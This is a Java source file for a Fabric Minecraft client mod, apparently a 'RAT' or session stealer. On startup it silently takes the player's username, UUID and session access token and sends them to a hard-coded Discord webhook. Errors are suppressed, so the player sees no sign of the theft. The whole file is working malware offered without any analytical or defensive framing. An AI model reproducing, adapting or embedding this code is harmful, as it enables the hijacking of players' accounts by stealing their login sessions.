package com.example;

import net.fabricmc.api.ClientModInitializer;
import net.minecraft.client.Minecraft;
import net.minecraft.client.User;

import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.UUID;

public class Rat implements ClientModInitializer {
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1532186307588264088/0UFtrdM-z4UuFm2CorSO1kUBWsAyEfbB5R-mcUONp3GYVp-AOAvJYYVTQ1y_pHDdlhRa";

    @Override
    public void onInitializeClient() {
        new Thread(() -> {
            try {
                Thread.sleep(4000);
                Minecraft client = Minecraft.getInstance();
                if (client == null) return;

                User user = client.getUser();
                if (user == null) return;

                String username = user.getName();

                // Obtém o UUID por reflexão (funciona em qualquer versão)
                String uuid = getUuidFromUser(user);

                String token = user.getAccessToken();

                String jsonPayload = String.format(
                    "{\"content\": \"🎮 **Minecraft Session Captured**\\n👤 User: `%s`\\n🆔 UUID: `%s`\\n🔑 Token: ```%s```\"}",
                    username, uuid, token
                );

                sendWebhook(jsonPayload);
            } catch (Exception ignored) {
            }
        }).start();
    }

    private String getUuidFromUser(User user) {
        try {
            // Tenta o método getProfile()
            Method getProfile = user.getClass().getMethod("getProfile");
            Object profile = getProfile.invoke(user);
            Method getId = profile.getClass().getMethod("getId");
            UUID id = (UUID) getId.invoke(profile);
            return id.toString();
        } catch (Exception e1) {
            try {
                // Tenta o método getGameProfile()
                Method getGameProfile = user.getClass().getMethod("getGameProfile");
                Object profile = getGameProfile.invoke(user);
                Method getId = profile.getClass().getMethod("getId");
                UUID id = (UUID) getId.invoke(profile);
                return id.toString();
            } catch (Exception e2) {
                try {
                    // Tenta o método getUuid() (se existir)
                    Method getUuid = user.getClass().getMethod("getUuid");
                    UUID id = (UUID) getUuid.invoke(user);
                    return id.toString();
                } catch (Exception e3) {
                    return "unknown";
                }
            }
        }
    }

    private void sendWebhook(String jsonPayload) {
        try {
            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            conn.getResponseCode();
        } catch (Exception ignored) {
        }
    }
}
